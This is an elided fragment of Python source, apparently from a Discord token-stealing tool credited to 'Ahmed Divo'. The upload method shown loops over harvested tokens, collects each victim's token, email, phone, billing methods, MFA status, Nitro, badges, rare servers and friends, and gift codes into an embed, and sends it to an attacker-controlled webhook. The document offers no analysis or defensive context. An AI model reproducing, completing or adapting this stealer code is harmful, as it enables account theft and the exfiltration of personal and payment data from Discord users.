    ...
    def upload(self):
        ...
        for token in self.tokens:
            ...
            if guilds:
                ...
                hq_guilds = '\n'.join(hq_guilds) if hq_guilds else "`No HQ Guilds Found`"
            else:
                hq_guilds = "`No HQ Guilds Found`"
            ...
            if friends:
                ...
                for friend in friends:
                    ...
                    inds = [flag[1] for flag in self.calc_flags(friend['user']['public_flags'])[::-1] if flag[1] not in unprefered_flags]
                ...
                hq_friends = '\n'.join(hq_friends) if hq_friends else "`No Rare Friends`"
            else:
                hq_friends = "`No Rare Friends`"
            ...
            if gift_codes:
                ...
                codes = '\n\n'.join(codes) if codes else "`No Gifts Found`"
            else:
            ...
            embed.add_field(name=":sweat_drops: Token:", value=f"```{token}```", inline=False)
            embed.add_field(name=":envelope: Email:", value=f"```{email if email != None else 'None'}```", inline=False)
            embed.add_field(name=":telephone: Phone:", value=f"```{phone if phone != None else 'None'}```", inline=False)
            embed.add_field(name=":rocket: Nitro:", value=f"```{nitro}```", inline=True)
            embed.add_field(name=":dizzy: Badges:", value=f"```{badges if badges != '' else 'None'}```", inline=True)
            embed.add_field(name=":dollar: Billing:", value=f"```{payment_methods if payment_methods != '' else 'None'}```", inline=True)
            embed.add_field(name=":guitar: MFA:", value=f"```{mfa}```", inline=True)
            embed.add_field(name="\u200b", value="\u200b", inline=False)
            
                    
            if hq_guilds != None:
                embed.add_field(name=":beginner: HQ Guilds:", value=hq_guilds, inline=False)


            if hq_friends != None:            
                embed.add_field(name=":two_men_holding_hands: HQ Friends:", value=hq_friends, inline=False)


            if codes != None:
                embed.add_field(name=":tada: Gift Codes:", value=codes, inline=False)
            embed.add_field(name="\u200b", value="\u200b", inline=False)

            embed.set_footer(icon_url="https://i.imgur.com/Zi9wtJ3.png", text="By: Ahmed Divo")

            self.webhook.send(embed=embed, username="GX-Divo",
                              avatar_url="https://i.imgur.com/Zi9wtJ3.png")
